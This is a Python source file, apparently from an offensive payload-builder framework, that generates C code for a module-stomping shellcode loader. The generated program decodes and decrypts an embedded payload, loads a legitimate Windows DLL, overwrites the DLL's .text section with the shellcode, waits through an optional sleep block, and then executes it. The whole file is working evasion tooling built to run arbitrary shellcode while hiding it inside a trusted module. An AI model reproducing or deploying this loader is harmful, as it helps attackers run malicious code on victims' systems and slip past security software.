#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""C source generator for local module stomping (.text overwrite)."""

from __future__ import annotations

from lib.compile.injection_common import InjectionBuilder


class ModuleStompingBuilder(InjectionBuilder):
    def build_source(
        self,
        encoded_payload: str,
        key: bytes,
        iv=None,
        *,
        dll_name: str = "version.dll",
    ) -> str:
        dll = dll_name.replace("\\", "\\\\").replace('"', '\\"')
        return f"""
{chr(10).join(self.headers())}
{self.pe_macros()}

char* enc_payload = "{encoded_payload}";
char* stomp_dll = "{dll}";

static BOOL stomp_and_execute(PBYTE shellcode, SIZE_T size)
{{
    HMODULE module = LoadLibraryA(stomp_dll);
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    PIMAGE_SECTION_HEADER section;
    WORD i;
    PVOID text_base = NULL;
    DWORD text_size = 0;
    DWORD old = 0;

    if (!module) return FALSE;

    dos = (PIMAGE_DOS_HEADER)module;
    nt = (PIMAGE_NT_HEADERS)((PBYTE)module + dos->e_lfanew);
    section = IMAGE_FIRST_SECTION(nt);

    for (i = 0; i < nt->FileHeader.NumberOfSections; i++)
    {{
        if (memcmp(section[i].Name, ".text", 5) == 0)
        {{
            text_base = (PBYTE)module + section[i].VirtualAddress;
            text_size = section[i].Misc.VirtualSize;
            break;
        }}
    }}

    if (!text_base || text_size < size) return FALSE;
    if (!VirtualProtect(text_base, text_size, PAGE_EXECUTE_READWRITE, &old)) return FALSE;
    memcpy(text_base, shellcode, size);
    VirtualProtect(text_base, text_size, PAGE_EXECUTE_READ, &old);
    FlushInstructionCache(GetCurrentProcess(), text_base, size);

    {self.sleep_block()}
    ((void(*)())text_base)();
    return TRUE;
}}

int main(void)
{{
{self.decode_preamble()}
{self.decrypt_block(key, iv)}
    if (!stomp_and_execute(shellcode_buf, payload_size)) return 1;
    VirtualFree(shellcode_buf, 0, MEM_RELEASE);
    free(decoded);
    return 0;
}}
"""
